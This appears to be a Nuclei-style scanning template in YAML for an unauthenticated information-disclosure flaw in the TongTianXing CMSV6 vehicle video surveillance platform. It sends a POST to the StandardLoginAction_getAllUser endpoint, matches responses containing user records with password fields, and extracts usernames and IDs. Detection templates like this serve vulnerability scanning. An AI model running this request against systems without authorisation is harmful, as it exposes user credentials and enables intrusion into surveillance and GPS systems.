script_name: 通天星CMSV6车载视频监控平台 StandardLoginAction_getAllUser 信息泄露漏洞
content:
id: tongtianxing-cmsv6-StandardLoginAction_getAllUser-list
info:
  name: 通天星CMSV6车载视频监控平台 StandardLoginAction_getAllUser 信息泄露漏洞
  author: hyy
  severity: high
  description: |
    通天星CMSV6车载视频监控平台 StandardLoginAction_getAllUser存在信息泄露漏洞
  reference:
    - Internal Research
    - Vulnerability Analysis Report on TongTianXing CMSV6
  tags: web,unauth,leak,cmsv6,gps

requests:
  - method: POST
    path:
      - "{{BaseURL}}/808gps/StandardLoginAction_getAllUser.action"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
      Connection: close

    body: "json=null"

    # 等待响应并进行匹配
    matchers:
      # 匹配响应体中包含敏感字段（必须全部命中）
      - type: word
        words:
          - "result"
          - "infos"
          - "password"
          - "id"
          - "companyName"
          - "lstRole"
        part: body
        condition: and

      # 匹配状态码为 200
      - type: status
        status:
          - 200

    # 提取返回的用户名和用户ID（便于后续分析）
    extractors:
      - type: regex
        name: extracted_user
        regex:
          - "\"name\"\\s*:\\s*\"([^\"]+)\""
          - "\"id\"\\s*:\\s*\"?([^\"]+)\"?"
        

    matchers-condition: and
